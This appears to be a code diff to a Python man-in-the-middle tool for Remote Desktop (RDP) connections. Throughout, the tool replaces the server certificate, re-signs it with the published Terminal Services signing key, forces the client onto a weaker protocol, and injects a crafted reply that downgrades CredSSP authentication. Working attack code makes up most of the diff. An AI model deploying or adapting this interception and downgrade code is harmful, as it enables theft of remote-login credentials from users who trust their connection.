@@ -47,7 +47,7 @@ args = parser.parse_args()
 
 
 
-TERM_SIGN_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
+TERM_PRIV_KEY = { # little endian, from [MS-RDPBCGR].pdf
     "n": [ 0x3d, 0x3a, 0x5e, 0xbd, 0x72, 0x43, 0x3e, 0xc9, 0x4d, 0xbb, 0xc1,
           0x1e, 0x4a, 0xba, 0x5f, 0xcb, 0x3e, 0x88, 0x20, 0x87, 0xef, 0xf5,
           0xc1, 0xe2, 0xd7, 0xb7, 0x6b, 0x9a, 0xf2, 0x52, 0x45, 0x95, 0xce,
@@ -112,7 +112,7 @@ class RC4(object):
         print("Updating session keys...")
         pad1 = b"\x36"*40
         pad2 = b"\x5c"*48
-        # TODO
+        # TODO finish this
 
 def substr(s, offset, count):
     return s[offset:offset+count]
@@ -253,7 +253,6 @@ def reencrypt_client_random(bytes):
 
 
 def generate_rsa_key(keysize):
-    print(str(keysize))
     p = subprocess.Popen(
         ["openssl", "genrsa", str(keysize)],
         stdout=subprocess.PIPE,
@@ -267,6 +266,7 @@ def generate_rsa_key(keysize):
     p.stdout.close()
     output = key_pipe.communicate()[0]
 
+        # parse the text output
     key = None
     result = {}
     for line in output.split(b'\n'):
@@ -493,7 +493,6 @@ def replace_server_cert(bytes):
     key_len = len(crypto["modulus"])-8
     crypto["mykey"] = generate_rsa_key(key_len*8)
     new_modulus = crypto["mykey"]["modulus"].to_bytes(key_len + 8, "little")
-    print(key_len,len(new_modulus), new_modulus)
     old_modulus = crypto["modulus"]
     result = bytes.replace(old_modulus, new_modulus)
     new_pubkey_blob = crypto["pubkey_blob"].replace(old_modulus,
@@ -510,8 +509,8 @@ def sign_certificate(bytes):
     m.update(bytes)
     m = m.digest() + b"\x00" + b"\xff"*45 + b"\x01"
     m = int.from_bytes(m, "little")
-    d = int.from_bytes(TERM_SIGN_PRIV_KEY["d"], "little")
-    n = int.from_bytes(TERM_SIGN_PRIV_KEY["n"], "little")
+    d = int.from_bytes(TERM_PRIV_KEY["d"], "little")
+    n = int.from_bytes(TERM_PRIV_KEY["n"], "little")
     s = pow(m, d, n)
     return s.to_bytes(len(crypto["sign"]), "little")
 
@@ -588,7 +587,7 @@ def parse_rdp_packet(bytes, From="Client"):
         print("\033[31m%s\033[0m" % result.decode())
 
 
-def tamper_data(bytes):
+def tamper_data(bytes, From="Client"):
     result = bytes
 
     global crypto
@@ -603,10 +602,23 @@ def tamper_data(bytes):
     if m:
         result = replace_server_cert(bytes)
 
+        # MARKER2
     regex = b".*%s..010c" % hexlify(b"McDn")
     m = re.match(regex, hexlify(bytes))
     if m:
         result = set_fake_requested_protocol(bytes, m)
+
+        # MARKER3
+    regex = b"\x30.\xa0.*\x6d"
+    m = re.match(regex, bytes)
+    global downgrade_credssp
+    global server_challenge
+    if m and "server_challenge" in globals() and From == "Server":
+        if (not "downgrade_credssp" in globals()):
+            print("Downgrading CredSSP")
+            downgrade_credssp = True
+            result = b"\x30\x0D\xA0\x03\x02\x01\x04\xA4\x06\x02\x04\xC0\x00\x00\x5E"
+
 
     if not result == bytes and args.debug:
         print("Tampered data:")
@@ -616,6 +628,7 @@ def tamper_data(bytes):
 
 
 def set_fake_requested_protocol(data, m):
+    print("Hiding forged protocol request from client...")
     offset = len(m.group())//2
     result = data[:offset+6] + bytes([RDP_PROTOCOL_OLD]) + data[offset+7:]
     return result
@@ -703,25 +716,20 @@ def forward_data():
     readable, _, _ = select.select([local_conn, remote_socket], [], [])
     for s_in in readable:
         if s_in == local_conn:
-            data = s_in.recv(4096)
-            if len(data)==4096:
-                while len(data)%4096 == 0:
-                    data += s_in.recv(4096)
-            if data == b"": return close()
-            dump_data(data, From="Client")
-            parse_rdp(data, From="Client")
-            data = tamper_data(data)
-            remote_socket.send(data)
+            From="Client"
+            to_socket = remote_socket
         elif s_in == remote_socket:
-            data = s_in.recv(4096)
-            if len(data)==4096:
-                while len(data)%4096 == 0:
-                    data += s_in.recv(4096)
-            if data == b"": return close()
-            dump_data(data, From="Server")
-            parse_rdp(data, From="Server")
-            data = tamper_data(data)
-            local_conn.send(data)
+            From="Server"
+            to_socket = local_conn
+        data = s_in.recv(4096)
+        if len(data)==4096:
+            while len(data)%4096 == 0:
+                data += s_in.recv(4096)
+        if data == b"": return close()
+        dump_data(data, From=From)
+        parse_rdp(data, From=From)
+        data = tamper_data(data, From=From)
+        to_socket.send(data)
     return True
 
 
@@ -746,8 +754,10 @@ def run():
         try:
             if not forward_data():
                 break
-        except ssl.SSLError as e :
+        except ssl.SSLError as e:
             print("SSLError: %s" % str(e))
+        except ConnectionResetError:
+            print("The client has disconnected")
 
 
 local_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
